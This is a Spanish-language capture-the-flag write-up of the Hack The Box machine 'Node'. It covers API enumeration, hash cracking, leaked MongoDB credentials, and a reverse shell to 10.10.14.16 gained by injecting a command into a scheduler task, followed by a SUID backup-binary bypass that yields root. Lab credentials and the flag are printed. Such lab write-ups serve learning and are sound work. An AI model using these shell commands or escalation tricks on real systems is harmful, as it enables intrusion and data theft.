# 10.10.10.58 - Node
![Node](https://user-images.githubusercontent.com/96772264/207566426-66d18b08-c3d5-4732-b434-31dcc9ea91dc.png)

--------------------
# Part 1: Enumeración

Puertos abiertos 22(ssh), 3000(Apache)
- La web del puerto 3000 es un Apache Hadoop.

Parece una página de red social "MyPlace"
![node1](https://user-images.githubusercontent.com/96772264/207566493-6a48db0e-1d84-421e-b10d-5191c3f80680.PNG)

```console
└─$ wfuzz --hc=404 --hw=249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.58:3000/FUZZ" -t 200
000000151:   301        9 L      15 W       173 Ch      "uploads"
000000278:   301        9 L      15 W       171 Ch      "assets"
000001468:   301        9 L      15 W       171 Ch      "vendor"
```
--------------------
# Part 2: Encontrando una api

Al no encontrar nada en el código fuente, en Network al recargar salen más rutas.  
- home.html está en /partials/home.html  
- Muchas peticiones a /assets/js/app/ -> /controllers/profile.js y /controllees/admin.js  
- petición a /api/users/latest -> hay una api  

```console
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
 ...
```
Hacemos fuzzing a la api:   
```console
└─$ wfuzz --hc=404 --hw=249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.58:3000/api/FUZZ" -t 200
000000189:   200        0 L      1 W        611 Ch      "users"
000009507:   200        0 L      1 W        23 Ch       "session"

└─$ curl -s http://10.10.10.58:3000/api/session | jq
{"authenticated": false}
```

Si intento romper los hashes con john y el rockyou no tengo suerte, en la web crackstation utilizan un diccionario mucho mas grande.
```
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af	sha256	manchester: myP14ceAdm1nAcc0uNT  
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240	sha256	spongebob: tom  
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73	sha256	snowflake: mark  
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0	Unknown	Not found: rastating  
```

Probamos a registrarnos con myP14ceAdm1nAcc0uNT:manchester en login y es correcto.  
![node2](https://user-images.githubusercontent.com/96772264/207566613-a3c132e8-ed37-4221-9c79-f52a9074b551.PNG)

--------------------
# Part 3: Nos descargamos un backup

Nos deja descargar el backup, que es un archivo en base64.  
```console
└─$ cat myplace.backup | base64 -d > myplace
└─$ file myplace # Zip archive
└─$ mv myplace myplace.zip
└─$ unzip myplace.zip # Pide contraseña
└─$ zip2john myplace.zip > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
magicword        (myplace.backup.zip)
```
El zip tiene carpetas /var/www/myplace y dentro: ```/node_modules  static   app.html   app.js   package-lock.json   package.json```

App.js revela una nueva ruta:  
- "/api/admin/backup" (supongo que de donde se descarga el backup)  
- "/api/session/authenticate" se encarga del login  
- Hash para mongo db 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 (ni el cracksation lo rompe)  
- mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace'  

Supongo que el hash sale de esto "5AYRft73VtFpc84k"...
```console
└─$ sshpass -p "5AYRft73VtFpc84k" ssh mark@10.10.10.58;
```
--------------------
# Part 4: Dentro del sistema, mongodb

Analizo el sistema con mi [herramienta](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh)
- Usuarios: mark (nosotros), tom, frank y root  
- SUID: /usr/local/bin/backup -> no podemos ejecutarlo  
- Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian  
- Tom está corriendo con node dos cosas: /var/scheduler/app.js y /var/www/myplace/app.js (lo que bajamos antes en el backup)  

En scheduler/app.js llaman la atención estas lienas:  
```js
const url='mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
setInterval(function () {  
  db.collection('tasks').find().toArray(function (error, docs) {  
    if (!error && docs) {
      docs.forEach(function (doc) {
        if (doc) {
          console.log('Executing task ' + doc._id + '...');
          exec(doc.cmd);
          db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) }); }
```
En mongodb (base de datos nosqli basada en json) a las tablas se le llaman colecciones. En concreto este usaurio se puede autenticar la base de datos "scheduler" 
por lo que pone arriba y acceder a la coleccion "tasks". Dentro de esas tablas cada entrada es un "documento". Según el código printea el valor id y ejecuta el 
valor cmd, es decir la estructura sería ```{"id":1,"cmd":"whoami"}```

```console
mark@node:/tmp$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
connecting to: scheduler
> show collections
tasks
> db.tasks.find()
# Nada
> db.tasks.insert({"cmd":"ping -c 1 10.10.14.16"})
# Me llega el ping con "sudo tcpdump -i tun0 icmp -n"
```
Por tanto si hacemos ```> db.tasks.insert({"cmd":"bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'"})``` y si estamos en escucha con netcat, al poco tiempo
recibiremos la shell como Tom.

--------------------
# Part 5: Ruta absoluta vs ruta relativa

Si vemos el archivo app.js que teniamos de antes nos topamos con el bianrio de altos privilegios que encontramos antes:
```
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
app.get('/api/admin/backup', function (req, res) {
  if (req.session.user && req.session.user.is_admin) {
    var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
    var backup = '';
```
Por tanto como prueba:
```
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /home/tom/user.txt; echo
UEsDBAoACQAAAJlKjlXkl4H2LQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAA3KVmWOglpljdXgLAAEEAAAAAAToAwAABFUtRp/jTckZT5lVBNrqBPlYskjQjWqk8ZhXOujRAJHgoFBLHd68hZFe8ncZUEsHCOSXgfYtAAAAIQAAAFBLAQIeAwoACQAAAJlKjlXkl4H2LQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADcpWZY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA=
```
```console
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98... /root/root.txt
└─$ echo "UEsDB..." | base64 -d > root.zip
└─$ 7z x root.zip # pide contraseña
└─$ zip2john root.zip > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
magicword        (root.zip/root.txt)
└─$ 7z x root.zip # magicword
```

Lo que nos sale como "root.txt" es una trollface en ascii.

Cuando hicimos la prueba con el user.txt no salia este mensaje "[+] Finished! Encoded backup is below:"
Si hacemos un ltrace:
```console
tom@node:/$ ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea703... /root/rootxt
strstr("/root/root.txt", "..")                                            = nil
strstr("/root/root.txt", "/root")
# EL codigo de printear la trollface
```
Es decir si detecta "/root" o ".." te sale la trollface. Habria otras maneras de indicar ese directorio?  
- Probamos con regex como /roo? o /roo* pero lo mismo.  
- SI ponemos ruta relativa es decir "root" ejecutando el programa desde la raiz nos sale un base64 mucho mas largo ya que no está el "/"

```console
└─$ echo "UEsDBAoAAAAAAMRlEVUA..." | base64 -d > root.zip
└─$ 7z x root.zip # magicword
└─$ cd root
└─$ cat root.txt
01aec8e9d5c3d08a8b97ec84a362cbcc
```

Si no hubiera existido el app.js de ayuda podriamos haber dado con el funcionamiento dek programa igual con ltrace
```console
tom@node:/$ ltrace /usr/local/bin/backup a
exit(1 <no return ...>
tom@node:/$ ltrace /usr/local/bin/backup a b
exit(1 <no return ...>
tom@node:/$ ltrace /usr/local/bin/backup a b c
strcmp("a", "-q")
strcat("/etc/myplace/key", "s")                                           = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                                           = 0x8b8d008

tom@node:/$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110

tom@node:/$ ltrace /usr/local/bin/backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 c
# Estos son los patrones que activan el trollface
strstr("c", "..")
strstr("c", "/root")
strchr("c", ';')
strchr("c", '&')
strchr("c", '`')
strchr("c", '$')
strchr("c", '|')
strstr("c", "//")
strcmp("c", "/")
strstr("c", "/etc")
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>

tom@node:/$ ltrace /usr/local/bin/backup -q a01a6aa5aaf1d7729f35c8278daae30f... /home/tom/user.txt
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_821390232", "/home/tom/user.txt") = 82
system("/usr/bin/base64 -w0 /tmp/.backup"...UEsDBAoACQ.... --- SIGCHLD (Child exited) ---
remove("/tmp/.backup_821390232")
# Hace un zip del directorio que le indiquemos y lo mete en un archivo temporal, que luego printea en base64 y 
# elimina
```
-------------------

# Extra

```
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQ
QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQ
QQQP\'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQ
QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQ
QW jQkQ@ jWQQD\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\'<mWWWWWQW?^  ` ]6QQ\' yQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
```

